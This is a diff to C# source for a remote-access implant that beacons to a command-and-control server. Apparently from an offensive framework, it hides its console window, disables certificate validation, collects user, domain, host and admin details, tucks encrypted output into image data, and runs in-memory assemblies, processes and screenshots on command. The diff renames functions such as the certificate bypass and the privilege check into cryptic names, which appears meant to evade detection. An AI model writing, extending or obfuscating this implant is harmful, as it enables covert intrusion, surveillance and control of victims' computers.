@@ -17,14 +17,15 @@ public class Program
 	static extern IntPtr GetConsoleWindow();
 	[DllImport("user32.dll")]
 	static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+	[DllImport("shell32.dll")]
+    static extern IntPtr CommandLineToArgvW([MarshalAs(UnmanagedType.LPWStr)] string lpCmdLine, out int pNumArgs);
 	public const int SW_HIDE = 0;
 	public const int SW_SHOW = 5;
-
 	public static void Sharp()
 	{
 		var handle = GetConsoleWindow();
 		ShowWindow(handle, SW_HIDE);
-		AllowUntrustedCertificates();
+		AUnTrCrts();
 		try { primer(); } catch {
 			var mre = new System.Threading.ManualResetEvent(false);
 			mre.WaitOne(300000);
@@ -34,12 +35,32 @@ public class Program
 			}
 		}
 	}
-
 	public static void Main()
 	{
 		Sharp();
 	}
+    static string[] CLArgs(string cl)
+    {
+        int argc;
+        var argv = CommandLineToArgvW(cl, out argc);
+        if (argv == IntPtr.Zero)
+            throw new System.ComponentModel.Win32Exception();
+        try
+        {
+            var args = new string[argc];
+            for (var i = 0; i < args.Length; i++)
+            {
+                var p = Marshal.ReadIntPtr(argv, i * IntPtr.Size);
+                args[i] = Marshal.PtrToStringUni(p);
+            }
 
+            return args;
+        }
+        finally
+        {
+            Marshal.FreeHGlobal(argv);
+        }
+    }
 	static byte[] Combine(byte[] first, byte[] second)
 	{
 		byte[] ret = new byte[first.Length + second.Length];
@@ -47,7 +68,6 @@ public class Program
 		Buffer.BlockCopy(second, 0, ret, first.Length, second.Length);
 		return ret;
 	}
-
 	static System.Net.WebClient GetWebRequest(string cookie)
 	{
 		var x = new System.Net.WebClient();
@@ -81,7 +101,6 @@ public class Program
 
 		return x;
 	}
-
 	static string Decryption(string key, string enc)
 	{
 		var b = System.Convert.FromBase64String(enc);
@@ -105,14 +124,12 @@ public class Program
 			Array.Clear(IV, 0, 16);
 		}
 	}
-
-	static bool IsHighIntegrity()
+	static bool ihInteg()
 	{
 		System.Security.Principal.WindowsIdentity identity = System.Security.Principal.WindowsIdentity.GetCurrent();
 		System.Security.Principal.WindowsPrincipal principal = new System.Security.Principal.WindowsPrincipal(identity);
 		return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
-	}
-	
+	}	
 	static string Encryption(string key, string un, bool comp = false, byte[] unByte = null)
 	{
 		byte[] byEnc = null;
@@ -137,7 +154,6 @@ public class Program
 			return System.Convert.ToBase64String(Combine(a.IV, f));
 		}
 	}
-
 	static System.Security.Cryptography.SymmetricAlgorithm CreateCam(string key, string IV, bool rij = true)
 	{
 		System.Security.Cryptography.SymmetricAlgorithm a = null;
@@ -161,7 +177,7 @@ public class Program
 
 		return a;
 	}
-	static void AllowUntrustedCertificates()
+	static void AUnTrCrts()
 	{
 		try
 		{
@@ -169,7 +185,6 @@ public class Program
 		}
 		catch { }
 	}
-
 	static void primer()
 	{
 		if (Convert.ToDateTime("#REPLACEKILLDATE#") > DateTime.Now)
@@ -181,7 +196,7 @@ public class Program
 			} catch {
 				u = System.Environment.UserName;
 			}
-			if (IsHighIntegrity())
+			if (ihInteg())
 			  u += "*";
 			var dn = System.Environment.UserDomainName;
 			var cn = System.Environment.GetEnvironmentVariable("COMPUTERNAME");
@@ -225,72 +240,68 @@ public class Program
 			ImplantCore(baseURL, RandomURI, URLS, KillDate, Sleep, NewKey, IMGs, Jitter);
 		}
 	}
-
 	static byte[] Compress(byte[] raw)
 	{
-    using (MemoryStream memory = new MemoryStream())
-    {
-      using (GZipStream gzip = new GZipStream(memory, CompressionMode.Compress, true))
-      {
-        gzip.Write(raw, 0, raw.Length);
-      }
-      return memory.ToArray();
-    }
-	}
-	
-	static Type LoadSomething(string assemblyQualifiedName)
+	    using (MemoryStream memory = new MemoryStream())
+	    {
+	      using (GZipStream gzip = new GZipStream(memory, CompressionMode.Compress, true))
+	      {
+	        gzip.Write(raw, 0, raw.Length);
+	      }
+	      return memory.ToArray();
+	    }
+	}	
+	static Type LoadS(string assemblyqNme)
 	{
-		return Type.GetType(assemblyQualifiedName, (name) =>
+		return Type.GetType(assemblyqNme, (name) =>
 		   {
 			   return AppDomain.CurrentDomain.GetAssemblies().Where(z => z.FullName == name.FullName).LastOrDefault();
 		   }, null, true);
 	}
-	
-	static string RunAssembly(string c)
+	static string rAsm(string c)
 	{
 		var splitargs = c.Split(new string[] { " " }, StringSplitOptions.RemoveEmptyEntries);
 		int i = 0;
 		string sOut = null;
 		bool runexe = true;
-		string sMethod = "", splittheseargs = "", qualifiedname = "", name = "";
+		string sMethod = "", sta = "", qNme = "", name = "";
 		foreach (var a in splitargs)
 		{
 			if (i == 1)
-				qualifiedname = a;
+				qNme = a;
 			if (i == 2)
 				name = a;
-
 			if (c.ToLower().StartsWith("run-exe")) {
 				if (i > 2)
-					splittheseargs = splittheseargs + " " + a;
+					sta = sta + " " + a;
 			} else {
 				if (i == 3)
 					sMethod = a;
 				else if (i > 3)
-					splittheseargs = splittheseargs + " " + a;
+					sta = sta + " " + a;
 			}
 			i++;
 		}
-		var splitnewargs = Regex.Matches(splittheseargs, @"[\""].+?[\""]|[^ ]+").Cast<Match>().Select(m => m.Value).ToArray();
-		var asArgs = splitnewargs.Select(x => x.Replace("^", " ")).ToArray();
+		string[] l = CLArgs(sta);
+		var asArgs = l.Skip(1).ToArray();
 		foreach (var Ass in AppDomain.CurrentDomain.GetAssemblies())
 		{
 			if (Ass.FullName.ToString().ToLower().StartsWith(name.ToLower()))
 			{
-				var loadedType = LoadSomething(qualifiedname + ", " + Ass.FullName);
+				var lTyp = LoadS(qNme + ", " + Ass.FullName);
 				try
 				{
 					if (c.ToLower().StartsWith("run-exe"))
-						sOut = loadedType.Assembly.EntryPoint.Invoke(null, new object[] { asArgs }).ToString();
+						sOut = lTyp.Assembly.EntryPoint.Invoke(null, new object[] { asArgs }).ToString();
 					else
 					{
 						try
 						{
-							sOut = loadedType.Assembly.GetType(qualifiedname).InvokeMember(sMethod, BindingFlags.Public | BindingFlags.InvokeMethod | BindingFlags.Static, null, null, new object[] { asArgs }).ToString();
+							sOut = lTyp.Assembly.GetType(qNme).InvokeMember(sMethod, BindingFlags.Public | BindingFlags.InvokeMethod | BindingFlags.Static, null, null, new object[] { asArgs }).ToString();
 						}
 						catch
 						{
-							var asOut = loadedType.Assembly.GetType(qualifiedname).InvokeMember(sMethod, BindingFlags.Public | BindingFlags.InvokeMethod | BindingFlags.Static, null, null, null).ToString();
+							var asOut = lTyp.Assembly.GetType(qNme).InvokeMember(sMethod, BindingFlags.Public | BindingFlags.InvokeMethod | BindingFlags.Static, null, null, null).ToString();
 						}
 					}
 				}
@@ -300,7 +311,6 @@ public class Program
 		}
 		return sOut;
 	}
-
 	static int Parse_Beacon_Time(string time, string unit)
 	{
 		int beacontime = Int32.Parse(time);
@@ -314,8 +324,7 @@ public class Program
 				break;
 		}
 		return beacontime;
-	}
-	
+	}	
 	internal static class UrlGen
 	{
 		static List<String> _stringnewURLS = new List<String>();
@@ -335,8 +344,7 @@ public class Program
 			string URL = _stringnewURLS[_rnd.Next(_stringnewURLS.Count)];
 			return String.Format("{0}/{1}{2}/?{3}", _baseUrl, URL, Guid.NewGuid(), _randomURI);
 		}
-	}
-	
+	}	
 	internal static class ImgGen
 	{
 		static Random _rnd = new Random();
@@ -369,8 +377,7 @@ public class Program
 			System.Array.Copy(cmdoutput, 0, ImageBytesFull, imgBytes.Length + BytePadding.Length, cmdoutput.Length);
 			return ImageBytesFull;
 		}
-	}
-	
+	}	
 	static void ImplantCore(string baseURL, string RandomURI, string stringURLS, string KillDate, string Sleep, string Key, string stringIMGS, string Jitter)
 	{
 		UrlGen.Init(stringURLS, RandomURI, baseURL);
@@ -406,8 +413,7 @@ public class Program
 				catch
 				{
 					continue;
-				}
-	
+				}	
 				if (x.ToLower().StartsWith("multicmd"))
 				{
 					var splitcmd = x.Replace("multicmd", "");
@@ -452,7 +458,7 @@ public class Program
 							bool sShot = true;
 							int sShotCount = 1;
 							while(sShot) {
-								var sHot = RunAssembly("run-exe Core.Program Core get-screenshot");
+								var sHot = rAsm("run-exe Core.Program Core get-screenshot");
 								var eTaskId = Encryption(Key, taskId);
 								var dcoutput = Encryption(Key, strOutput.ToString(), true);
 								var doutputBytes = System.Convert.FromBase64String(dcoutput);
@@ -478,7 +484,7 @@ public class Program
 						}
 						else if (cmd.ToLower().StartsWith("run-dll") || cmd.ToLower().StartsWith("run-exe"))
 						{
-							output.AppendLine(RunAssembly(cmd));
+							output.AppendLine(rAsm(cmd));
 						}
 						else if (cmd.ToLower().StartsWith("start-process"))
 						{
@@ -528,5 +534,4 @@ public class Program
 			}
 		}
 	}
-
 }
